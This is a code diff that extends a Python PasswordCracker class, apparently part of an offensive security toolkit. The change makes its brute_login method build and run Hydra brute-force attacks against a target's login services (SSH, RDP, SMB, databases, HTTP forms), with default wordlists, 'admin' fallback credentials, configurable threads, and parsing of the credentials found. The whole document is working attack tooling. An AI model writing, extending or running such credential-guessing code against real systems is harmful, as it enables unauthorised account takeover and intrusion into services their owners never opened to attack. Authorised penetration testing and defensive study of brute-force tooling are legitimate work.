@@ -632,25 +632,60 @@ class PasswordCracker:
         self.hydra_available = shutil.which('hydra') is not None
         self.john_available = shutil.which('john') is not None
     
-    def brute_login(self, target: str, service: str, userlist: str = None, passlist: str = None) -> Dict:
-        """Brute force login credentials"""
+    def brute_login(self, target: str, service: str, userlist: str = None, passlist: str = None, 
+                    username: str = None, password: str = None, port: int = None, threads: int = 4) -> Dict:
+        """Brute force login credentials using Hydra"""
         if not self.hydra_available:
             return self._get_default_creds(service)
         
         # Use default wordlists if not provided
-        if not userlist:
+        if not userlist and not username:
             userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
-        if not passlist:
-            passlist = '/usr/share/wordlists/rockyou.txt'
+        if not passlist and not password:
+            passlist = '/usr/share/wordlists/common_passwords.txt'
+        
+        # Verify wordlists exist
+        if userlist and not os.path.exists(userlist):
+            userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
+        if passlist and not os.path.exists(passlist):
+            passlist = '/usr/share/wordlists/common_passwords.txt'
         
         try:
-            cmd = ['hydra', '-L', userlist, '-P', passlist, target, service, '-t', '4', '-f']
+            # Build Hydra command
+            cmd = ['hydra']
+            
+            # Add username/userlist
+            if username:
+                cmd.extend(['-l', username])
+            elif userlist and os.path.exists(userlist):
+                cmd.extend(['-L', userlist])
+            else:
+                cmd.extend(['-l', 'admin'])
+            
+            # Add password/passlist
+            if password:
+                cmd.extend(['-p', password])
+            elif passlist and os.path.exists(passlist):
+                cmd.extend(['-P', passlist])
+            else:
+                cmd.extend(['-p', 'admin'])
+            
+            # Add target
+            cmd.append(target)
+            
+            # Add service with port if specified
+            if port:
+                cmd.extend(['-s', str(port)])
+            cmd.append(service)
+            
+            # Add options
+            cmd.extend(['-t', str(threads), '-f', '-V'])
             
             result = subprocess.run(
                 cmd,
                 capture_output=True,
                 text=True,
-                timeout=600
+                timeout=300
             )
             
             # Parse results
@@ -666,11 +701,27 @@ class PasswordCracker:
             
             return {
                 'success': True,
+                'tool': 'hydra',
+                'target': target,
+                'service': service,
                 'credentials_found': creds,
-                'output': result.stdout
+                'found_count': len(creds),
+                'command': ' '.join(cmd[:6]) + ' ...',  # Partial command for reference
+                'output': result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout
             }
+        except subprocess.TimeoutExpired:
+            return {'success': False, 'error': 'Brute force timeout - try fewer credentials'}
         except Exception as e:
             return {'success': False, 'error': str(e)}
+    
+    def get_supported_services(self) -> List[str]:
+        """Get list of services Hydra supports"""
+        return [
+            'ssh', 'ftp', 'telnet', 'smtp', 'pop3', 'imap', 
+            'mysql', 'postgres', 'mssql', 'oracle', 'vnc', 'rdp',
+            'smb', 'ldap', 'http-get', 'http-post', 'http-form-get', 
+            'http-form-post', 'https-get', 'https-post'
+        ]
     
     def crack_hash(self, hash_value: str, hash_type: str = 'auto') -> Dict:
         """Crack password hash"""
